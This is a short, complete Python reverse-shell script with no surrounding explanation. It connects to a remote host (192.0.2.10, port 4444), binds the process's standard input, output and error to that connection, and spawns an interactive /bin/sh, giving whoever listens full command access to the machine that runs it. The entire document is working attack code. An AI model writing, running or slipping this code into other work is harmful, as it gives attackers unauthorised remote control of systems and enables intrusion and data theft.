import socket
import os
import pty

channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
channel.connect(('192.0.2.10', 4444))
for descriptor in (0, 1, 2):
    os.dup2(channel.fileno(), descriptor)
pty.spawn('/bin/sh')
